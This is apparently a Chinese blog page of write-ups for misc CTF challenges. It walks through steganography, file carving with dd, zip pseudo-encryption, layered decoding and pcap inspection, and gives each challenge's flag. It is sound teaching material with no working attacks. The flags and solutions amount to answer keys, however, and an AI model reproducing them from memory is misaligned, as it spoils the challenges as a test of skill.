<p><code>flag&#123;THISISFLAG&#125;</code></p>
<h2 id="miss-01-x2F-太湖杯-1"><a href="#miss-01-x2F-太湖杯-1" class="headerlink" title="miss_01&#x2F;太湖杯(1)"></a>miss_01&#x2F;太湖杯(1)</h2><p>附件是一个加密的压缩包，没给密码提示，可能是伪加密</p>
<p>用<code>zipCenop.jar</code>成功解密</p>
<p>这里也可以用<code>winrar</code>进行压缩包修复，也可以成功解密</p>
<p>在解压后的文档文件里，有一串base64编码</p>
<p>因为题目提示<code>miss</code>，所以这里可能会用到显示&#x2F;隐藏编辑标记</p>
<p><img data-src="/../images/WRITEUP/image-20221212145057757.png" alt="image-20221212145057757"></p>
<p><img data-src="/../images/WRITEUP/image-20221212145542771.png" alt="image-20221212145542771"></p>
<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=914">希尔密码</a>，解密得到</p>
<p><img data-src="/../images/WRITEUP/image-20221212145524578.png" alt="image-20221212145524578"></p>
<p>然后把上面的那一串用<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=679">rabbit解密</a>，密钥是<code>love and peaceee</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX194m4B5HqBSGYPLTS4bywdKDJh13lrSj/OcwgSAoHBw9X/p2IdEtGx7EdJFR6rcjyPA+M+aKLZvqE7h7EBFA5LyHYk/5Cns4LV02vM7Dk+T70FlWOlJ3XeA9pJwFdAWzeN/0A74u+hLG/oLF1g3djo77yVTCBCs0r7khTOWahv0SYR33tHSq3YzJGTBS1Zsj2i/sGC8tTnNfsLl0SQ2JeTJhP/aNU2LmPVTyc3y4kTx+ysw8vasHwenWoBXFtOe2WkorJOCrqdQ8Qqd78TzZ0jRMv6MJO2ytUy/3mebHU9LAlWKFluNEh5t/cUVvtigLS6PquYRX5ziEx52HDkW+WgfRnum/AregLJ4c4f6AvG2gBjHVKO6sGEiuh59jcyN1SvsQEvXd7cOD/KWZjE5gqVGUJqXyhauqWPVYUlcuHH6abtQwNuDb+jZxMg5QaDzwPhpGRly7NhKU5OgCdhdK17TX7z2/RuNYj6pyfRYNZmQdOFl9B28+lawKO8l5b18WF5JV6chou7riwwDLqQrKMDjUUKZUtdMn0ReDQbR8reeqw/u+Lkyhl6w+222QWgQ2yRd2dhHb1kqNncUInAEqTPNKRBnia8F/+FycBv+KAwCFPwx9oNTFBYN4EJL/RjiXEkkSCnyH48VynuuOeX2uNlAti214mCbWWH+pxLn4PHIWf3JK819kiDcjqyQ5y3v+EUEr9Sb1WVwiITDW5XtzVP+Yr/IJ0ikl41zMu9BAQPermoa8hZJdE8mb3oSet+pAM7PtnyI7FGJ5Ynkpq05AiJMrN+UgV0E/ELc0UhWw3O0c4u+eYtQkzu/9+UCRy1Fi+QWFlO3cuWBA4GMGTE1FHWnqnZ683FwrM5bcb6TTu3/Q5sppFmqNrOX+ctx5b5xiYeSZ8XFI2ks6L7aFrQYu833GiERnIiZEX8vFqjdnD+tcuQ6Zg9Z7oxhATDP9H5d1e9IaxwOA/fDP0qvdKJ+OS5OPljnboywCPp7QqFHZfyC7d2GIraadSOL+eIwfavCqgfGwpWMW5H359IKZASi/HexzEcYrA7OZ8GzSxO9Lmk/ea4BD4JD2lawEIiDE7yhJApimzJ4IG8EMXFn/rOM3O2PkuSTKFsXu7/XZ3ozAJsPun5RJcMuUFXQX++DqXqe6Kbo/hEKwHETq0VbL6qEKkQKf5ce3i6tuZG8OqqPsye0Ku5D2LREqqGGysshULZWmvlx4u2FUtj4Xg==</span><br></pre></td></tr></table></figure>

<p>解密后得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LR2TMNLCGBOHKNDGGVRFY5JWGZTDAXDVMZTDCYK4OU4GCZRYLR2TSNTCHBOHKNJUMM4VY5JVGBSTOXDVHE3DIZC4OU2TIM3ELR2TQYLGHBOHKOJWGQYFY5JWGQ3DSXDVHE3GEOC4OU2TAZJXLR2TOZRTMROHKOBVME4VY5JVGRQTIXDVHAYDEOC4OU4GCZRYLR2TSNTCHBOHKNRRGY3VY5JVHA2WKXDVHAZDOMS4OU2WGMDBLR2TKNDDHFOHKODGMU3FY5JYMFSTMXDVG5QTOYK4OU3DENBQLR2TSNRUMROHKNRSGEYVY5JVMZTDKXDVHE3GEOC4OU3TSNJXLR2TQYLFGZOHKNLGMY2VY5JVGRRTSXDVHE3DIMC4OU2TMYRULR2TKNDDHFOHKNJWMM4VY5JUMZSWKXDVGU4TGN24OU4TMM3GLR2TMY3FGJOHKOBSG4ZFY5JYGM4GCXDVGVRGGMS4OU4GCZJWLR2TKOBVMVOHKNJUHEZFY5JYGM4GCXDVG43TGZK4OU3DEMJRLR2TKNDDHFOHKNRSGQYFY5JUMYYGMXDVHAYDKZK4OU4DKYJZLR2TSNTCHBOHKNRRGBSFY5JZGVRWIXDVGU2DGNS4OU3DENBQLR2TIZTFMVOHKNRWGJTFY5JYGI3TEXDVGY2DMOK4OU4GCMZWLR2TKNTCGROHKNJUMM4VY5JZHA2TQXDVGYYTAZC4OU2TIYZZLR2TKMZXGNOHKNDGMVSVY5JVGRRTSXDVG5QTOYK4OU4DOMLDLR2TSNRUGBOHKNJWMM4VY5JUMYYGMXDVGVTGMNK4OU2TIYZZLR2TMNBWHFOHKNJUMM4VY5JUMVQTMXDVHAZTQYK4OU2TIYZZLR2TONZTMVOHKNJUME2FY5JVHE4DEXDVHE4DKOC4OU2TSOBS</span><br></pre></td></tr></table></figure>

<p>base32解密后得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u65b0\u4f5b\u66f0\uff1a\u8af8\u96b8\u54c9\u50e7\u964d\u543d\u8af8\u9640\u6469\u96b8\u50e7\u7f3d\u85a9\u54a4\u8028\u8af8\u96b8\u6167\u585e\u8272\u5c0a\u54c9\u8fe6\u8ae6\u7a7a\u6240\u964d\u6211\u5ff5\u96b8\u7957\u8ae6\u5ff5\u54c9\u9640\u56b4\u54c9\u56c9\u4fee\u5937\u963f\u6ce2\u8272\u838a\u5bc2\u8ae6\u585e\u5492\u838a\u773e\u6211\u54c9\u6240\u4f0f\u805e\u85a9\u96b8\u610d\u95cd\u5436\u6240\u4fee\u662f\u8272\u6469\u8a36\u56b4\u54c9\u9858\u610d\u54c9\u5373\u4fee\u54c9\u7a7a\u871c\u9640\u56c9\u4f0f\u5ff5\u54c9\u6469\u54c9\u4ea6\u838a\u54c9\u773e\u54a4\u5982\u9858\u5982</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=670">unicode</a>解码得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：諸隸哉僧降吽諸陀摩隸僧缽薩咤耨諸隸慧塞色尊哉迦諦空所降我念隸祗諦念哉陀嚴哉囉修夷阿波色莊寂諦塞咒莊眾我哉所伏聞薩隸愍闍吶所修是色摩訶嚴哉願愍哉即修哉空蜜陀囉伏念哉摩哉亦莊哉眾咤如願如</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a>解密得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Live beautifully, dream passionately, love completely.</span><br></pre></td></tr></table></figure>

<p>将解密结果作为密码解压压缩包，得到音频</p>
<p>在<code>audacity</code>中打开音频并查看频谱图</p>
<p><img data-src="/../images/WRITEUP/image-20221212151129097.png" alt="image-20221212151129097"></p>
<p>得到flag</p>
<p><code>flag&#123;m1sc_1s_funny2333&#125;</code></p>
<h2 id="Ditf-x2F-安恒9月赛-1"><a href="#Ditf-x2F-安恒9月赛-1" class="headerlink" title="Ditf&#x2F;安恒9月赛(1)"></a>Ditf&#x2F;安恒9月赛(1)</h2><p>附件是图片，<code>stegsolve</code>没有发现隐写</p>
<p>用binwalk分出了压缩包，不过加密了</p>
<p>用<code>zipCenOp.jar</code>没有发现伪加密</p>
<p>这里需要修改文件的宽高，用010Editor打开文件</p>
<p>把高改成1300，得到密码</p>
<p><img data-src="/../images/WRITEUP/image-20221212153455358.png" alt="image-20221212153455358"></p>
<p><img data-src="/../images/WRITEUP/e02c9de40be145dba6baa80ef1d270ba.png" alt="e02c9de40be145dba6baa80ef1d270ba"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StRe1izia</span><br></pre></td></tr></table></figure>

<p>解压得到pcapng文件，wireshark打开</p>
<p>分组详情搜索<code>png</code>并追踪HTTP流，得到一串Base64编码</p>
<p><img data-src="/../images/WRITEUP/image-20221212154218577.png" alt="image-20221212154218577"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tPel80bmRfSGlyMF9sb3YzX0ZvcjN2ZXJ9</span><br></pre></td></tr></table></figure>

<p>解码得到flag</p>
<p><code>flag&#123;Oz_4nd_Hir0_lov3_For3ver&#125;</code></p>
<h2 id="a-good-idea-x2F-NJUPT-CTF-1"><a href="#a-good-idea-x2F-NJUPT-CTF-1" class="headerlink" title="a_good_idea&#x2F;NJUPT-CTF(1)"></a>a_good_idea&#x2F;NJUPT-CTF(1)</h2><p><code>stegsolve</code>没线索，<code>binwalk</code>分解</p>
<p>得到文本文件和两张图片，文本文件中有提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try to find the secret of pixels</span><br></pre></td></tr></table></figure>

<p>这里可以用<code>stegsolve</code>打开<code>to_do.png</code>，然后<code>image combiner</code>选择<code>to.png</code></p>
<p>切换SUB通道后，得到二维码，扫码得到flag</p>
<p><code>NCTF&#123;m1sc_1s_very_funny!!!&#125;</code></p>
<h2 id="Aesop-secret-x2F-ISCC-1"><a href="#Aesop-secret-x2F-ISCC-1" class="headerlink" title="Aesop_secret&#x2F;ISCC(1)"></a>Aesop_secret&#x2F;ISCC(1)</h2><p>分帧拼起来发现没啥用</p>
<p>可以用<a target="_blank" rel="noopener" href="https://tu.sioe.cn/gj/fenjie/">动态图片解析网站</a>解析一下，<del>不需要用ps拼</del></p>
<p><img data-src="/../images/WRITEUP/image-20221212163620277.png" alt="image-20221212163620277"></p>
<p><code>stegsolve--file format</code>，可以看到末尾有一串编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==</span><br></pre></td></tr></table></figure>

<p>用AES解密（为什么不是rabbit），密钥为<code>ISCC</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18OvTUlZubDnmvk2lSAkb8Jt4Zv6UWpE7Xb43f8uzeFRUKGMo6QaaNFHZriDDV0EQ/qt38Tw73tbQ==</span><br></pre></td></tr></table></figure>

<p>再解密一次，得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DugUpADiamondADeepDarkMine&#125;</span><br></pre></td></tr></table></figure>

<h2 id="normal-png-1"><a href="#normal-png-1" class="headerlink" title="normal_png(1)"></a>normal_png(1)</h2><p>010Editor打开报error，图片可能被修改了宽高</p>
<p><img data-src="/../images/WRITEUP/image-20221212171500105.png" alt="image-20221212171500105"></p>
<p>长度调成1075</p>
<p>得到flag</p>
<p><code>flag&#123;B8B68DD7007B1E406F3DF624440D31E0&#125;</code></p>
<h2 id="glance-50-x2F-CTF-1"><a href="#glance-50-x2F-CTF-1" class="headerlink" title="glance-50&#x2F;CTF(1)"></a>glance-50&#x2F;CTF(1)</h2><p>在<a target="_blank" rel="noopener" href="https://tu.sioe.cn/gj/fenjie/">动图解析网站</a>导入gif，得到flag</p>
<p><code>TWCTF&#123;Bliss by Charles O&#39;Rear&#125;</code></p>
<h2 id="hit-the-core-x2F-CTF-1"><a href="#hit-the-core-x2F-CTF-1" class="headerlink" title="hit-the-core&#x2F;CTF(1)"></a>hit-the-core&#x2F;CTF(1)</h2><p><code>010Editor</code>打开后搜索<code>&#123;</code></p>
<p><img data-src="/../images/WRITEUP/image-20221212173002909.png" alt="image-20221212173002909"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;</span><br></pre></td></tr></table></figure>

<p>其中前部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc</span><br></pre></td></tr></table></figure>

<p>可以看到其中包含大写字母<code>ALEXCTF</code>，且字符间距为5</p>
<p>按此规律把所有的字符挑出来，得到flag</p>
<p><code>ALEXCTF&#123;K33P_7H3_g00D_w0rk_up&#125;</code></p>
<h2 id="reverseMe-x2F-XCTF-1"><a href="#reverseMe-x2F-XCTF-1" class="headerlink" title="reverseMe&#x2F;XCTF(1)"></a>reverseMe&#x2F;XCTF(1)</h2><p>把附件图片翻转(reverse)一下就能得到flag</p>
<p><code>flag&#123;4f7548f93c7bef1dc6a0542cf04e796e&#125;</code></p>
<h2 id="misc-pic-again-1"><a href="#misc-pic-again-1" class="headerlink" title="misc_pic_again(1)"></a>misc_pic_again(1)</h2><p><code>stegsolve</code>打开后，<code>Data extract</code>发现前几位恰好是压缩包的格式</p>
<p><img data-src="/../images/WRITEUP/image-20221213093531903.png" alt="image-20221213093531903"></p>
<p><code>save bin</code>保存16进制并命名为<code>1.zip</code></p>
<p>解压后用<code>010Editor</code>打开，根据题目描述：flag &#x3D; <code>hctf&#123;[a-zA-Z0-9~]*&#125;</code></p>
<p>搜索<code>hctf</code>，得到<code>flag</code></p>
<p><img data-src="/../images/WRITEUP/image-20221213094258087.png" alt="image-20221213094258087"></p>
<p><code>hctf&#123;scxdc3tok3yb0ard4g41n~~~&#125;</code></p>
<h2 id="hong-1"><a href="#hong-1" class="headerlink" title="hong(1)"></a>hong(1)</h2><p>附件是一个音频文件，但是打开后提示不支持此类型，说明它应该不是一个mp3格式的文件</p>
<p>在kali中执行<code>file hong.mp3</code>，发现它确实不是</p>
<p><img data-src="/../images/WRITEUP/image-20221213095340520.png" alt="image-20221213095340520"></p>
<p>用<code>binwalk</code>分解，可以看到里面有两张图片</p>
<p><img data-src="/../images/WRITEUP/image-20221213095458400.png" alt="image-20221213095458400"></p>
<p>使用dd工具分离</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd if=hong.mp3 of=1.jpg skip=82483 bs=1</span><br><span class="line">dd if=hong.mp3 of=2.jpg skip=138170 bs=1</span><br></pre></td></tr></table></figure>

<p>在2.jpg上可以得到flag</p>
<p><img data-src="/../images/WRITEUP/2.jpg" alt="2"></p>
<p><code>BCTF&#123;cute&amp;fat_cats_does_not_like_drinking&#125;</code></p>
<h2 id="Test-flag-please-ignore-x2F-CTF-1"><a href="#Test-flag-please-ignore-x2F-CTF-1" class="headerlink" title="Test-flag-please-ignore&#x2F;CTF(1)"></a>Test-flag-please-ignore&#x2F;CTF(1)</h2><p>附件里包含一串字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b68656c6c6f5f776f726c647d</span><br></pre></td></tr></table></figure>

<p>这是16进制，转字符得到flag</p>
<p><code>flag&#123;hello_world&#125;</code></p>
<h2 id="Janos-the-Ripper-x2F-CTF-1"><a href="#Janos-the-Ripper-x2F-CTF-1" class="headerlink" title="János-the-Ripper&#x2F;CTF(1)"></a>János-the-Ripper&#x2F;CTF(1)</h2><p><code>010Editor</code>打开发现是压缩包</p>
<p><img data-src="/../images/WRITEUP/image-20221213101242795.png" alt="image-20221213101242795"></p>
<p>改后缀后发现加密了，用<code>zipcenop.jar</code>发现是真加密</p>
<p>爆破试一下，得到口令</p>
<p><img data-src="/../images/WRITEUP/image-20221213102800385.png" alt="image-20221213102800385"></p>
<p>解压得到<code>flag</code></p>
<p><code>flag&#123;ev3n::y0u::bru7us?!&#125;</code></p>
<h2 id="Erik-Baleog-and-Olaf-x2F-CTF-1"><a href="#Erik-Baleog-and-Olaf-x2F-CTF-1" class="headerlink" title="Erik-Baleog-and-Olaf&#x2F;CTF(1)"></a>Erik-Baleog-and-Olaf&#x2F;CTF(1)</h2><p><code>010Editor</code>打开发现是<code>png</code>格式</p>
<p>改后缀后用<code>stegsolve</code>打开</p>
<p>在<code>blue plane 1</code>发现一个二维码</p>
<p><img data-src="/../images/WRITEUP/blue1.bmp" alt="blue1"></p>
<p>但是直接扫不出来，得ps一下(~~臣妾做不到啊~~~)，然后扫描得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;#justdiffit&#125;</span><br></pre></td></tr></table></figure>

<h2 id="can-has-stdio-x2F-CTF-1"><a href="#can-has-stdio-x2F-CTF-1" class="headerlink" title="can_has_stdio?&#x2F;CTF(1)"></a>can_has_stdio?&#x2F;CTF(1)</h2><p>打开附件发现长这样</p>
<p><img data-src="/../images/WRITEUP/image-20221213111435453.png" alt="image-20221213111435453"></p>
<p>这是BrainFuck编码，<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">解码</a>后得到flag</p>
<p><code>flag&#123;esolangs_for_fun_and_profit&#125;</code></p>
<h2 id="Training-Stegano-1-1"><a href="#Training-Stegano-1-1" class="headerlink" title="Training-Stegano-1(1)"></a>Training-Stegano-1(1)</h2><p>打开查看，发现有个passwd</p>
<p><img data-src="/../images/WRITEUP/image-20221213112438766.png" alt="image-20221213112438766"></p>
<p><del>我以为是<code>flag&#123;steganoI&#125;</code></del>，没想到flag就是</p>
<p><code>steganoI</code></p>
<h2 id="simple-transfer-x2F-XCTF-1"><a href="#simple-transfer-x2F-XCTF-1" class="headerlink" title="simple_transfer&#x2F;XCTF(1)"></a>simple_transfer&#x2F;XCTF(1)</h2><p><del>可能数据包出问题了</del>？wireshark协议分级和其它人的结果不一样</p>
<p>用binwalk可以看到里面有pdf文件</p>
<p><img data-src="/../images/WRITEUP/image-20221213163725735.png" alt="image-20221213163725735"></p>
<p>用dd工具分离一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=f9809647382a42e5bfb64d7d447b4099.pcap of=1.pdf skip=339380 bs=1</span><br></pre></td></tr></table></figure>

<p>打开得到flag</p>
<p><code>HITB&#123;b3d0e380e9c39352c667307d010775ca&#125;</code></p>
<h2 id="2017-Dating-in-Singapore-x2F-XCTF-1"><a href="#2017-Dating-in-Singapore-x2F-XCTF-1" class="headerlink" title="2017_Dating_in_Singapore&#x2F;XCTF(1)"></a>2017_Dating_in_Singapore&#x2F;XCTF(1)</h2><p>附件里是一个日历</p>
<p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01081522291516170310172431-050607132027262728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625</span><br></pre></td></tr></table></figure>

<p>这个描述可以分成十二行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01081522291516170310172431</span><br><span class="line">050607132027262728</span><br><span class="line">0102030209162330</span><br><span class="line">02091623020310090910172423</span><br><span class="line">02010814222930</span><br><span class="line">0605041118252627</span><br><span class="line">0203040310172431</span><br><span class="line">0102030108152229151617</span><br><span class="line">04050604111825181920</span><br><span class="line">0108152229303124171003</span><br><span class="line">261912052028211407</span><br><span class="line">04051213192625</span><br></pre></td></tr></table></figure>

<p>且每两位都不超过31，按照顺序连一下</p>
<p><img data-src="/../images/WRITEUP/image-20221213173319261.png" alt="image-20221213173319261"></p>
<p>得到flag</p>
<p><code>HITB&#123;CTFFUN&#125;</code></p>
<h2 id="pure-color-x2F-CTF-1"><a href="#pure-color-x2F-CTF-1" class="headerlink" title="pure_color&#x2F;CTF(1)"></a>pure_color&#x2F;CTF(1)</h2><p><code>stegsolve</code>打开，在<code>Gray bits</code>可以得到flag</p>
<p><img data-src="/../images/WRITEUP/image-20221223094102772.png" alt="image-20221223094102772"></p>
<p><code>flag&#123;true_steganographers_doesnt_need_any_tools&#125;</code></p>
<h2 id="心仪的公司-x2F-世安杯-1"><a href="#心仪的公司-x2F-世安杯-1" class="headerlink" title="心仪的公司&#x2F;世安杯(1)"></a>心仪的公司&#x2F;世安杯(1)</h2><p><code>wireshark</code>打开，<code>http contains &quot;shell&quot;</code>筛选，追踪http流</p>
<blockquote>
<p>key、flag、shell、pass</p>
</blockquote>
<p><img data-src="/../images/WRITEUP/image-20221223101723058.png" alt="image-20221223101723058"></p>
<p>得到flag</p>
<p><code>fl4g:&#123;ftop_Is_Waiting_4_y&#125;</code></p>
<h2 id="适合作为桌面-x2F-世安杯-1"><a href="#适合作为桌面-x2F-世安杯-1" class="headerlink" title="适合作为桌面&#x2F;世安杯(1)"></a>适合作为桌面&#x2F;世安杯(1)</h2><p>stegsolve发现一个二维码</p>
<p><img data-src="/../images/WRITEUP/image-20221223103717159.png" alt="image-20221223103717159"></p>
<p>扫描得到下列</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000</span><br></pre></td></tr></table></figure>

<p>这是十六进制</p>
<p><img data-src="/../images/WRITEUP/image-20221223103800322.png" alt="image-20221223103800322"></p>
<p>保存后发现有<code>py</code>和<code>pyt</code>的字眼，可能是反编译</p>
<p>把它保存成<code>pyc</code>文件，用<code>uncompyle</code>反编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 1.pyc &gt;1.py</span><br></pre></td></tr></table></figure>

<p>得到python文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def flag():</span><br><span class="line">    str = [</span><br><span class="line">     102, 108, 97, 103, 123, 51, 56, 97, 53, 55, 48, 51, 50, 48, 56, 53, 52, 52, 49, 101, 55, 125]</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for i in str:</span><br><span class="line">        flag += chr(i)</span><br><span class="line"></span><br><span class="line">    print flag</span><br></pre></td></tr></table></figure>

<p>执行得到flag</p>
<p><code>flag&#123;38a57032085441e7&#125;</code></p>
<h2 id="Banmabanma-x2F-世安杯-1"><a href="#Banmabanma-x2F-世安杯-1" class="headerlink" title="Banmabanma&#x2F;世安杯(1)"></a>Banmabanma&#x2F;世安杯(1)</h2><p><img data-src="/../images/WRITEUP/%E6%96%91%E9%A9%AC%E6%96%91%E9%A9%AC.png" alt="斑马斑马"></p>
<p>这看着像条形码，<a target="_blank" rel="noopener" href="https://online-barcode-reader.inliteresearch.com/">扫描</a>得到(也可以在手机上扫)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG IS TENSHINE</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;TENSHINE&#125;</code></p>
<h2 id="真是阳间题-x2F-XSCTF联合招新赛-2"><a href="#真是阳间题-x2F-XSCTF联合招新赛-2" class="headerlink" title="真是阳间题&#x2F;XSCTF联合招新赛(2)"></a>真是阳间题&#x2F;XSCTF联合招新赛(2)</h2><p><img data-src="/../images/WRITEUP/image-20221223111544062.png" alt="image-20221223111544062"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3207357975641587136122466514425152961654613410728337142271750273124995105747053991640817066352343657398947248938255086358418100814441196784643527787764297</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://jisuan5.com/decimal-to-hexadecimal/">转十六进制</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3D3D3D3D513642475354334F4859464D37435A415450424F4454344348324D4E37434E36565A414F5A3358474859344B374B354144474E504553554355495A49</span><br></pre></td></tr></table></figure>

<p>转ascii</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI</span><br></pre></td></tr></table></figure>

<p>反转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IZIUCUSEPNGDA5K7K4YHGX3ZOAZV6NC7NM2HC4TDOBPTAZC7MFYHO3TSGB6Q====</span><br></pre></td></tr></table></figure>

<p>base32</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FQARD&#123;L0u_W0s_yp3_4_k4qrcp_0d_apwnr0&#125;</span><br></pre></td></tr></table></figure>

<p>凯撒</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HSCTF&#123;N0w_Y0u_ar3_4_m4ster_0f_crypt0&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Simple-Math-x2F-XSCTF联合招新赛-2"><a href="#Simple-Math-x2F-XSCTF联合招新赛-2" class="headerlink" title="Simple-Math&#x2F;XSCTF联合招新赛(2)"></a>Simple-Math&#x2F;XSCTF联合招新赛(2)</h2><p><img data-src="/../images/WRITEUP/image-20221223151355402.png" alt="image-20221223151355402"></p>
<p><a target="_blank" rel="noopener" href="https://matrix.reshish.com/zh/">矩阵计算器</a>求得[xi]为</p>
<p><img data-src="/../images/WRITEUP/image-20221223151404505.png" alt="image-20221223151404505"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">模2</span><br><span class="line">0011011001</span><br><span class="line">sha1</span><br><span class="line">103c8041593b4b8e38971db283a7a773b0ffc2ee</span><br></pre></td></tr></table></figure>

<p><code>XSCTF&#123;103c8041593b4b8e38971db283a7a773b0ffc2ee&#125;</code></p>
<h2 id="BotW-x2F-XSCTF联合招新赛-2"><a href="#BotW-x2F-XSCTF联合招新赛-2" class="headerlink" title="BotW-&#x2F;XSCTF联合招新赛(2)"></a>BotW-&#x2F;XSCTF联合招新赛(2)</h2><p>binwalk拆解，可以看到有两张图片</p>
<p><img data-src="/../images/WRITEUP/image-20221223152901433.png" alt="image-20221223152901433"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=BotW.png of=bb.jpg skip=7236 bs=1</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/WRITEUP/bb.jpg" alt="bb"></p>
<p>题目提示<code>MASTER USING IT AND YOU CAN HAVE THIS.</code></p>
<p>搜一下发现是塞尔达中的希卡文</p>
<p><img data-src="/../images/WRITEUP/0ad90cf7dcd4d81ba274cceea5dd13b1173d93a2.jpg@942w_1472h_progressive.webp" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOU GET THE FLAG! FLAG IS CANZELDAGETDUPLEXBOW</span><br></pre></td></tr></table></figure>

<p>flag要求：全小写，格式为flag{[a-z]*}</p>
<p><code>flag&#123;canzeldagetduplexbow&#125;</code></p>
